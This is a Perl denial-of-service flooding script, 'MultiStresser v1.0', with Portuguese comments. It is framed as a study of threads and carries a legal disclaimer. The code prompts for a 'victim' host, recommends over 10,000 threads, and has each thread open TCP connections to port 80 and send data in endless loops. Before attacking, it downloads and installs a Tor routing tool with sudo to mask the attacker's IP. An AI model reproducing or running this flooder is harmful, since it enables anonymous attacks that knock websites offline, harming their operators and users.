#!/usr/bin/perl 
#
# [!] CÓDIGO FEITO PARA ESTUDOS DE THREADS EM LINGUAGEM PERL [!]
#
# USE, EDITE, COMPILE. MAS SEMPRE DISTRIBUA O CÓDIGO FONTE!
# CONHECIMENTO DEVE SER LIVRE E DE TODOS! 
#
# CODED BY: HackerOrientado
#
# Me sigam no twitter -> @HackerOrientado
# Facebook -> facebook.com/CalsEvolution
# Página Ciência Hacker -> facebook.com/CienciaHacker
# Grupo Ciência Hacker -> facebook.com/groups/cienciahacker/
# Página no Facebook do Inurl Brasil -> facebook.com/InurlBrasil
# Blog Inurl Brasil -> blog.inurl.com.br/
#

############### MÓDULOS
use warnings;
use strict;
use threads;
use threads::shared;
use IO::Socket::INET;
use utf8;

binmode(STDOUT, ":utf8"); # CODE PARA SAÍDA utf8
system 'clear';

############### DECLARAÇÃO DE VARIAVÉIS
my (  $OS, $baner, $termo, $threads, $vitima, $VezesDeAtaque, $i, $threadsJoin, $socket, $t );
$OS = $^O;

$termo = "                                                 
                                                    [\!] CÓDIGO FEITO PARA ESTUDOS DE THREADS EM LINGUAGEM PERL [\!]

Ao usar este script, você concorda que esta ciente de que ao realizar um ataque de negação de serviço (DoS) é crime, e que qualquer ataque realizado a um servidor, IP, site, computador ou qualquer outro dispositivo eletrônico ligado ou não a internet sem conscientização do dono resultará em pena de prisão e/ou multa perante as leis do Estado em que ataca e/ou esta atacando, e que você (usuário final) é totalmente responsável pelo uso deste script.

Eu não me responsabilizo pelo mal uso deste script. ";

$baner = "
##     ## ##     ## ##       ######## ####           ######  ######## ########  ########  ######   ######  ######## ########  
###   ### ##     ## ##          ##     ##           ##    ##    ##    ##     ## ##       ##    ## ##    ## ##       ##     ## 
#### #### ##     ## ##          ##     ##           ##          ##    ##     ## ##       ##       ##       ##       ##     ## 
## ### ## ##     ## ##          ##     ##            ######     ##    ########  ######    ######   ######  ######   ########  
##     ## ##     ## ##          ##     ##                 ##    ##    ##   ##   ##             ##       ## ##       ##   ##   
##     ## ##     ## ##          ##     ##           ##    ##    ##    ##    ##  ##       ##    ## ##    ## ##       ##    ##  
##     ##  #######  ########    ##    ####           ######     ##    ##     ## ########  ######   ######  ######## ##     ## 
                                                                                                            
                                                                                                                             v1.0";
############### VERIFICAÇÃO DO SISTEMA OPERACIONAL
if ( $OS ne 'linux' ) {
	system "cls";
	print "\t\t\t\t[\!] AVISO [\!]\n\n";
	print "Desculpe mas e altamente recomendado o uso de sistemas operacionais Linux pelo \nfato de ser mais leve\!\n";
	print "Sistema Windows ou Mac consomem muita memória RAM e este script vai necessitar de bastante.\n";
	print "Não importa se você tem 16 Gigas ou mais, ele foi realmente pensando no uso em \ndistribuições Linux\n";
	sleep 1;
	exit (0);
}

################# VERIFICAÇÃO E USO DO Torify
################# TORIFY É UM PROJETO CRIADO POR ericpaulbishop QUE ENVIA TODO O TRAFEGO DA INTERNET PARA A REDE Tor USANDO IPTABLES
################# ESTE PROJETO ESTA NO Github A 2 ANOS PORÉM FUNCIONA MUITO BEM!
################# PARA QUEM TIVER DÚVIDAS DE QUEM SEU IP NÃO ESTA CAMUFLADO, VISTIE O SITE check.torproject.org OU USE O COMANDO "tcpdump host [IP QUE VC ESTA ATACANDO]" OU USE O Wireshark
################# EU NÃO CRIEI O Torify, ENTÃO DEVO TODOS OS CRÉDITOS PELA FERRAMENTA AO ericpaulbishop PELA ÓTIMA FERRAMENTA QUE ELE CRIOU :D
################# Github -> github.com/ericpaulbishop/iptables_torify
if ( -e "/etc/init.d/torify" ) {
    system ("sudo /etc/init.d/torify start");
} else {
    print "Torify não instalado D:\n";
    print "Instalando Torify...\n\n";
    sleep 1;
    system ("wget https://github.com/ericpaulbishop/iptables_torify/archive/master.zip -O ~/Downloads/torify.zip");
    system ("sudo apt-get install unzip");
    system ("unzip ~/Downloads/torify.zip");
    system ("mv iptables_torify-master ~/Downloads");
    system ("sudo sh ~/Downloads/iptables_torify-master/debian_install.sh");
    if ( -e "/etc/init.d/torify" ) {
        print "\n\n";
        print "Torify instalado com sucesso :D\n";
        print "Execute o script mais uma vez :D\n";
        system ("sudo rm -rf ~/Downloads/iptables_torify-master");
        system ("sudo rm -rf ~/Downloads/torify.zip");
        exit (0);
    } else {
        print "\n\n";
        print "Ouve algum problema na instalação...\n";
        print "Verifique se contem o arquivo torify no diretório /etc/init.d/\n";
        print "Tente executar novamente o script\n";
        print "Os arquivos baixados estão na pasta ~/Downloads para fazer a instalação manualmente\n";
        print "Basta você executar o 'debian_install.sh' que se encontra na pasta '~/Downloads/iptables_torify-master'\n";
        open FILE, ">torify.txt" or die "Impossível criar arquivo torify.txt\n";
        print FILE "https://github.com/ericpaulbishop/iptables_torify/archive/master.zip";
        close FILE;
        print "Se não, tente baixar o arquivo no Github no link que vai estar dentro do arquivo de texto com o nome de torify.txt\n";
    }
}

print $baner;
print "\n\n";

print $termo;
print "\n\n";

############### ENTRADA DA QUANTIDADE DE THREADS A SEREM USADAS
info1:
print "Digite a quantidade de threads a serem usadas.\n";
print "--> ";
$threads = <STDIN>; chomp $threads;

############### ENTRADA DO URL/HOST 
print "\n\n";
print "Digite o URL/HOST da vítima\n";
print "Sugiro mais de 10000 threads para um melhor ataque\n";
print "--> ";
$vitima = <STDIN>; chomp $vitima;
if ( $vitima !~ /www./ ) {
	$vitima = "www.".$vitima;
}

############### CÓDIGO PARA CRIAÇÃO AUTOMÁTICA DE THREADS >=D
for ( $i = 0; $i < $threads; $i++ ) {
    $threadsJoin = $threads.$i;
    $threadsJoin = threads->create( 'threads', '1' );
}

############### SUB ROTINAS PARA SER CHAMADA POR CADA THREAD >=D
sub threads {
	ataque:
	$socket = IO::Socket::INET->new (
		PeerAddr 	=> $vitima, 
		PeerPort 	=> '80', 
		Proto 		=> 'tcp' ) or die "\n\n[\!] NÃO FOI POSSÍVEL SE CONECTAR AO IP OU PORTA. [\!] \n[\!] PROVAVELMENTE O SERVIDOR CAIU [\!]\n\n";
		
	for ( $t = 0; $t < 64000; $t++ ) {
		print "Atacando $vitima na porta 80 ~ by MultiStresser\n";
		send ($socket, '64000', '1', '1');
	}
	goto ataque;
}

# EoF